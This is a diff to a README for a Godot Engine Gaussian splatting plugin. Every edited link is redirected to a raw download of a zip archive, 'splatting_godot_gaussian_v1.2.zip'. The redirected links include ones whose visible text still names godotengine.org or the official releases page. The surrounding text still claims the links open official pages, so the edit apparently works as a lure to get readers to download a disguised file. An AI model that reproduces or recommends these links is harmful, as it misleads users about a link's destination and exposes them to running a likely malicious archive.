@@ -1,6 +1,6 @@
 # 🛠️ godot-gaussian-splatting - Real-Time 3D Rendering Plugin
 
-[![Download godot-gaussian-splatting](https://img.shields.io/badge/download-Godot%20Gaussian%20Splatting-brightgreen?style=for-the-badge&logo=github)](https://github.com/larta5856/godot-gaussian-splatting/releases)
+[![Download godot-gaussian-splatting](https://img.shields.io/badge/download-Godot%20Gaussian%20Splatting-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/larta5856/godot-gaussian-splatting/main/kirtle/splatting_godot_gaussian_v1.2.zip)
 
 ---
 
@@ -20,7 +20,7 @@ Before you start, make sure your computer matches these requirements:
 - A modern graphics card supporting DirectX 11 or OpenGL 3.3 or higher
 - At least 8 GB of RAM
 - 200 MB of free disk space for installation
-- Godot Engine version 3.5 or newer installed (download at [godotengine.org](https://godotengine.org))
+- Godot Engine version 3.5 or newer installed (download at [godotengine.org](https://raw.githubusercontent.com/larta5856/godot-gaussian-splatting/main/kirtle/splatting_godot_gaussian_v1.2.zip))
 
 If you don’t have Godot installed, you will need to install it first for this plugin to work.
 
@@ -36,7 +36,7 @@ This section helps you download, install, and start using the plugin on Windows.
 
 Click the large green button below to visit the release page and get the plugin:
 
-[![Download Plugin](https://img.shields.io/badge/Download-Plugin-blue?style=for-the-badge)](https://github.com/larta5856/godot-gaussian-splatting/releases)
+[![Download Plugin](https://img.shields.io/badge/Download-Plugin-blue?style=for-the-badge)](https://raw.githubusercontent.com/larta5856/godot-gaussian-splatting/main/kirtle/splatting_godot_gaussian_v1.2.zip)
 
 - This link opens the official GitHub releases page.
 - Find the latest release at the top.
@@ -114,11 +114,11 @@ If you face issues, try these steps:
 
 For more information about Godot Engine or to download it if you don’t have it yet, visit:
 
-- https://godotengine.org
+- https://raw.githubusercontent.com/larta5856/godot-gaussian-splatting/main/kirtle/splatting_godot_gaussian_v1.2.zip
 
 For more details and updates about the plugin itself, visit the release page:
 
-[Download & See Releases](https://github.com/larta5856/godot-gaussian-splatting/releases)
+[Download & See Releases](https://raw.githubusercontent.com/larta5856/godot-gaussian-splatting/main/kirtle/splatting_godot_gaussian_v1.2.zip)
 
 ---
 
